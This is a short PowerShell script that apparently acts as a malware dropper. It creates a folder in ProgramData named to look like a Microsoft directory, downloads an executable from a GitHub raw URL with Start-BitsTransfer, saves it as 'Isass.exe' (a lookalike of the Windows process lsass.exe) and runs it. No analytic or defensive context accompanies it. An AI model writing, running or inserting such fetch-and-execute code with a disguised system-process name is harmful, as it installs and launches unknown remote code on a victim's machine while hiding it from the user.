$path = "C:\ProgramData\MicrosoftCorporation\Windows\SystemData\"
$fpath = "C:\ProgramData\MicrosoftCorporation\Windows\SystemData\Isass.exe" 
$furl = "https://github.com/foxovsky/PointBlank/raw/master/server/Auth/bin/Release/Game.exe"
 
$isfile = Test-Path $fpath 
if($isfile -eq "True") {}
else
{
	New-Item -ItemType directory -Path $path
	Start-BitsTransfer -Source $furl -Destination $fpath
	& $fpath
}